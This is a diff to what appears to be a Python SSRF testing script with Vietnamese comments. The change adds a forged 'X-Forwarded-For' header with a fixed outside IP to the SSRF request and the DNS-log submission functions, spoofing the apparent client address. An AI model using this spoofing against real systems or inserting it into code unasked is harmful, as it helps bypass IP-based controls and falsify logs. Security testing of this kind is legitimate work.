@@ -45,7 +45,8 @@ def send_ssrf_request(payload_url, tag=""):
     """Gửi yêu cầu kiểm thử thông qua tính năng xuất báo cáo từ xa"""
     headers = {
         "X-Request-ID": f"{CORRELATION_ID}-{tag}",
-        "Content-Type": "application/json"
+        "Content-Type": "application/json",
+        "X-Forwarded-For": "45.33.32.156"
     }
     if _session_token:
         headers["Authorization"] = f"Bearer {_session_token}"
@@ -77,7 +78,7 @@ def login_and_get_token():
 def _send_dns_log(subdomain, client_ip="172.20.0.3"):
     """Gửi DNS query log vào hệ thống qua DNS resolver endpoint"""
     url = f"{'https' if USE_HTTPS else 'http'}://{TARGET_HOST}:{TARGET_PORT}{DNS_ENDPOINT}"
-    headers = {"Content-Type": "application/json"}
+    headers = {"Content-Type": "application/json", "X-Forwarded-For": "45.33.32.156"}
     if _session_token:
         headers["Authorization"] = f"Bearer {_session_token}"
     payload = {
